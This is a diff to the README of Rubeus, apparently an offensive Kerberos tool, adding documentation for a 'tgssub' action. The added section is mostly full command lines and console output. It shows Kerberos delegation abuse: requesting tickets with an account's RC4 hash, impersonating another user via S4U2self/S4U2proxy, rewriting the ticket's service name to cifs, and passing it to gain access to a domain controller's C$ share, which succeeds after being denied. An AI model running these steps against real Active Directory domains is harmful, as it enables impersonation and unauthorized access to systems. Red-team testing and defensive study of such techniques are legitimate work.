@@ -50,6 +50,7 @@ Rubeus is licensed under the BSD 3-Clause license.
     + [createnetonly](#createnetonly)
     + [changepw](#changepw)
     + [hash](#hash)
+    + [tgssub](#tgssub)
   * [Compile Instructions](#compile-instructions)
     + [Targeting other .NET versions](#targeting-other-net-versions)
     + [Sidenote: Building Rubeus as a Library](#sidenote-building-rubeus-as-a-library)
@@ -2096,6 +2097,7 @@ Breakdown of the miscellaneous commands:
 | [createnetonly](#createnetonly) | Create a process of logon type 9 |
 | [changepw](#changepw) | Perform the Aorato Kerberos password reset |
 | [hash](#hash) | Hash a plaintext password to Kerberos encryption keys |
+| [tgssub](#tgssub) | Substitute in alternate service names into a service ticket |
 
 
 ### createnetonly
@@ -2225,6 +2227,287 @@ Calculating all hash formats:
     [*]       aes128_cts_hmac_sha1 : B0A79AB550536860123B427C14F2A531
     [*]       aes256_cts_hmac_sha1 : F7FEBF9779401B653911A56A79FF9E3A58F7F8990FDB3D9CA0E89227ABF13287
     [*]       des_cbc_md5          : 614589E66D6B3792
+
+
+### tgssub
+
+The **tgssub** action will take a service ticket base64 blob/file specification and substitute an alternate service name into the ticket. This is useful for S4U abuse and other scenarios.
+
+The `/altservice:X` flag is required and can either be a standalone sname (ldap, cifs, etc.) or a full service principal name (cifs/computer.domain.com). The latter is useful in some S4U2self abuse scenarios with resource-based constrained delegation. See Elad Shamir's [post on the topic](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) for more information.
+
+The `/ptt` flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session. The `/luid:0xA..` flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.
+
+Executing the S4U2self/S4U2proxy proces to abuse traditional constrained delegation, and replacing the sname in the final ticket. This is so you don't have to execute the S4U process for a second time:
+
+    C:\Rubeus>Rubeus.exe s4u /user:patsy /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /msdsspn:ldap/PRIMARY.testlab.local /impersonateuser:harmj0y /ptt
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.4.2
+
+    [*] Action: Ask TGT
+
+    [*] Using rc4_hmac hash: 2B576ACBE6BCFDA7294D6BD18041B8FE
+    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\patsy'
+    [+] TGT request successful!
+    [*] base64(ticket.kirbi):
+
+        doIE+jCCBPagAwIBBaEDAgEWoo...(snip)...
+
+
+    [*] Action: S4U
+
+    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Building S4U2self request for: 'patsy@TESTLAB.LOCAL'
+    [*] Sending S4U2self request
+    [+] S4U2self success!
+    [*] Got a TGS for 'harmj0y@TESTLAB.LOCAL' to 'patsy@TESTLAB.LOCAL'
+    [*] base64(ticket.kirbi):
+
+        doIFXjCCBVqgAwIBBaEDAgEWoo...(snip)...
+
+    [*] Impersonating user 'harmj0y' to target SPN 'ldap/PRIMARY.testlab.local'
+    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Building S4U2proxy request for service: 'ldap/PRIMARY.testlab.local'
+    [*] Sending S4U2proxy request
+    [+] S4U2proxy success!
+    [*] base64(ticket.kirbi) for SPN 'ldap/PRIMARY.testlab.local':
+
+        doIGPjCCBjqgAwIBBaEDAgEWoo...(snip)...
+
+    [*] Action: Import Ticket
+    [+] Ticket successfully imported!
+
+    C:\Rubeus>dir \\primary.testlab.local\C$
+    Access is denied.
+
+    C:\Rubeus>Rubeus.exe tgssub /ticket:doIGPjCCBjqgAwIBBaEDAgEWoo...(snip)... /altservice:cifs /ptt
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.4.2
+
+
+    [*] Action: Service Ticket sname Substitution
+
+    [*] Substituting in alternate service name: cifs
+    [*] base64(ticket.kirbi):
+
+        doIGPjCCBjqgAwIBBaEDAgEWoo...(snip)...
+
+    [*] Action: Describe Ticket
+
+    UserName              :  harmj0y@TESTLAB.LOCAL
+    UserRealm             :  TESTLAB.LOCAL
+    ServiceName           :  cifs/PRIMARY.testlab.local
+    ServiceRealm          :  TESTLAB.LOCAL
+    StartTime             :  3/1/2019 12:51:06 PM
+    EndTime               :  3/1/2019 5:51:06 PM
+    RenewTill             :  3/8/2019 12:51:06 PM
+    Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+    KeyType               :  aes128_cts_hmac_sha1
+    Base64(key)           :  yxQVMhl0qn3P0wUUC4KnGQ==
+
+
+    [*] Action: Import Ticket
+    [+] Ticket successfully imported!
+
+    C:\Rubeus>dir \\primary.testlab.local\C$
+    Volume in drive \\primary.testlab.local\C$ has no label.
+    Volume Serial Number is A48B-4D68
+
+    Directory of \\primary.testlab.local\C$
+
+    07/05/2018  12:57 PM    <DIR>          dumps
+    03/05/2017  04:36 PM    <DIR>          inetpub
+    07/21/2018  07:41 PM                 9 out.txt
+    08/22/2013  07:52 AM    <DIR>          PerfLogs
+    04/15/2017  05:25 PM    <DIR>          profiles
+    08/28/2018  11:51 AM    <DIR>          Program Files
+    08/28/2018  11:51 AM    <DIR>          Program Files (x86)
+    10/09/2018  12:04 PM    <DIR>          Temp
+    08/23/2018  03:52 PM    <DIR>          Users
+    10/25/2018  01:15 PM    <DIR>          Windows
+                1 File(s)              9 bytes
+                9 Dir(s)  40,463,851,520 bytes free
+
+    C:\Rubeus>Rubeus.exe klist
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.4.2
+
+
+
+    [*] Action: List Kerberos Tickets (Current User)
+
+    [*] Current LUID    : 0x6de14
+
+        [0] - 0x12 - aes256_cts_hmac_sha1
+        Start/End/MaxRenew: 3/1/2019 12:51:06 PM ; 3/1/2019 5:51:06 PM ; 3/8/2019 12:51:06 PM
+        Server Name       : cifs/PRIMARY.testlab.local @ TESTLAB.LOCAL
+        Client Name       : harmj0y @ TESTLAB.LOCAL
+        Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)
+
+        [1] - 0x12 - aes256_cts_hmac_sha1
+        Start/End/MaxRenew: 3/1/2019 12:51:06 PM ; 3/1/2019 5:51:06 PM ; 3/8/2019 12:51:06 PM
+        Server Name       : ldap/PRIMARY.testlab.local @ TESTLAB.LOCAL
+        Client Name       : harmj0y @ TESTLAB.LOCAL
+        Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)
+
+
+Executing S4U2self to a machine using its machine account hash, substituting in the service names we want to abuse after:
+
+    C:\Rubeus>Rubeus.exe s4u /user:primary$ /rc4:46b910dbe4514bd144b44cb554c256db /impersonateuser:harmj0y
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.4.2
+
+    [*] Action: Ask TGT
+
+    [*] Using rc4_hmac hash: 46b910dbe4514bd144b44cb554c256db
+    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\primary$'
+    [+] TGT request successful!
+    [*] base64(ticket.kirbi):
+
+        doIFIDCCBRygAwIBBaEDAgEWoo...(snip)...
+
+
+    [*] Action: S4U
+
+    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Building S4U2self request for: 'primary$@TESTLAB.LOCAL'
+    [*] Sending S4U2self request
+    [+] S4U2self success!
+    [*] Got a TGS for 'harmj0y@TESTLAB.LOCAL' to 'primary$@TESTLAB.LOCAL'
+    [*] base64(ticket.kirbi):
+
+        doIFgDCCBXygAwIBBaEDAgEWoo...(snip)...
+
+
+    C:\Rubeus>Rubeus.exe describe /ticket:doIFgDCCBXygAwIBBaEDAgEWoo...(snip)...
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.4.2
+
+
+    [*] Action: Describe Ticket
+
+    UserName              :  harmj0y@TESTLAB.LOCAL
+    UserRealm             :  TESTLAB.LOCAL
+    ServiceName           :  primary$
+    ServiceRealm          :  TESTLAB.LOCAL
+    StartTime             :  3/1/2019 12:43:56 PM
+    EndTime               :  3/1/2019 5:43:56 PM
+    RenewTill             :  3/8/2019 12:43:56 PM
+    Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable
+    KeyType               :  aes256_cts_hmac_sha1
+    Base64(key)           :  X6LnSCb4FUGo4Wec2FnfgQRz0h8zfgIRZxENxcIoIpU=
+
+    [!] Service ticket uses encryption key type 'aes256_cts_hmac_sha1', unable to extract hash and salt.
+
+
+    C:\Rubeus>dir \\primary.testlab.local\C$
+    Access is denied.
+
+    C:\Rubeus>Rubeus.exe purge
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.4.2
+
+    Luid: 0x0
+
+    [*] Action: Purge Tickets
+    [+] Tickets successfully purged!
+
+    C:\Rubeus>Rubeus.exe tgssub /ticket:doIFgDCCBXygAwIBBaEDAgEWoo...(snip)... /altservice:cifs/primary.testlab.local /ptt
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.4.2
+
+
+    [*] Action: Service Ticket sname Substitution
+
+    [*] Substituting in alternate service name: cifs/primary.testlab.local
+    [*] base64(ticket.kirbi):
+
+        doIFpjCCBaKgAwIBBaEDAgEWoo...(snip)...
+
+    [*] Action: Describe Ticket
+
+    UserName              :  harmj0y@TESTLAB.LOCAL
+    UserRealm             :  TESTLAB.LOCAL
+    ServiceName           :  cifs/primary.testlab.local
+    ServiceRealm          :  TESTLAB.LOCAL
+    StartTime             :  3/1/2019 12:43:56 PM
+    EndTime               :  3/1/2019 5:43:56 PM
+    RenewTill             :  3/8/2019 12:43:56 PM
+    Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable
+    KeyType               :  aes256_cts_hmac_sha1
+    Base64(key)           :  X6LnSCb4FUGo4Wec2FnfgQRz0h8zfgIRZxENxcIoIpU=
+
+
+    [*] Action: Import Ticket
+    [+] Ticket successfully imported!
+
+    C:\Rubeus>dir \\primary.testlab.local\C$
+    Volume in drive \\primary.testlab.local\C$ has no label.
+    Volume Serial Number is A48B-4D68
+
+    Directory of \\primary.testlab.local\C$
+
+    07/05/2018  12:57 PM    <DIR>          dumps
+    03/05/2017  04:36 PM    <DIR>          inetpub
+    08/22/2013  07:52 AM    <DIR>          PerfLogs
+    04/15/2017  05:25 PM    <DIR>          profiles
+    08/28/2018  11:51 AM    <DIR>          Program Files
+    08/28/2018  11:51 AM    <DIR>          Program Files (x86)
+    10/09/2018  12:04 PM    <DIR>          Temp
+    08/23/2018  03:52 PM    <DIR>          Users
+    10/25/2018  01:15 PM    <DIR>          Windows
+                1 File(s)              9 bytes
+                9 Dir(s)  40,462,831,616 bytes free
 
 
 ## Compile Instructions
